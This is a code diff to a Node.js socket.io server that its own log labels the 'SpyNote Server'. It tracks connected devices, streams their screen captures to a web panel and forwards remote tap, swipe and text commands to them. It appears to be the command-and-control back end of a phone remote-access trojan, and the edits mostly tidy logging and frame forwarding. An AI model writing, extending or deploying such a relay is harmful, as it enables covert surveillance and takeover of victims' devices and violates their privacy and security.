@@ -1,3 +1,4 @@
+
 const express = require('express');
 const http = require('http');
 const socketIo = require('socket.io');
@@ -10,12 +11,12 @@ const io = socketIo(server, {
     cors: { origin: "*", methods: ["GET", "POST"] },
     pingTimeout: 10000,
     pingInterval: 5000,
-    transports: ['websocket']
+    transports: ['websocket'] // ✅ Force WebSocket only
 });
 
 app.use(compression());
 app.use(express.static('public'));
-app.use(express.json({ limit: '100mb' })); // ✅ Increased limit for frames
+app.use(express.json({ limit: '50mb' }));
 
 const devices = new Map();
 
@@ -55,30 +56,18 @@ io.on('connection', (socket) => {
                 socketId: socket.id 
             });
             socket.join(deviceId);
-            console.log("📱 Device LIVE:", deviceId, deviceInfo.model);
+            console.log("📱 Device joined room:", deviceId);
             io.emit('devices-update', Array.from(devices.entries()));
         }
     });
 
-    // ✅ FIXED: Perfect screen frame forwarding
     socket.on('screen-frame', (data) => {
         const deviceId = data.deviceId;
         if (devices.has(deviceId)) {
-            // ✅ Forward to ALL clients in device room (including web panel)
-            socket.to(deviceId).emit('screen-update', {
-                deviceId: data.deviceId,
-                data: data.data,           // Base64 image
-                width: data.width,         // Screen width
-                height: data.height,       // Screen height  
-                timestamp: data.timestamp,
-                size: data.size
-            });
-            // ✅ Debug log (remove in production)
-            console.log(`📱 Frame ${deviceId.slice(0,8)}: ${data.size} bytes`);
+            socket.to(deviceId).emit('screen-update', data);
         }
     });
 
-    // ✅ FIXED: Control commands forwarded properly
     socket.on('control', (data) => {
         const { deviceId, action, x, y, startX, startY, endX, endY, text } = data;
         if (devices.has(deviceId)) {
@@ -92,7 +81,7 @@ io.on('connection', (socket) => {
                 endY: parseFloat(endY) || 0,
                 text: text || ''
             });
-            console.log(`🎮 ${action} → ${deviceId.slice(0,8)}`);
+            console.log('🎮 Control:', action, 'to', deviceId);
         }
     });
 
@@ -101,7 +90,7 @@ io.on('connection', (socket) => {
             if (info.socketId === socket.id) {
                 devices.set(deviceId, { ...info, connected: false });
                 io.emit('devices-update', Array.from(devices.entries()));
-                console.log('📱 Device OFFLINE:', deviceId);
+                console.log('📱 Device disconnected:', deviceId);
                 break;
             }
         }
@@ -110,6 +99,5 @@ io.on('connection', (socket) => {
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-    console.log(`🚀 SpyNote Server LIVE on port ${PORT}`);
-    console.log(`📱 Web Panel: http://localhost:${PORT}`);
+    console.log(`🚀 SpyNote Server running on port ${PORT}`);
 });
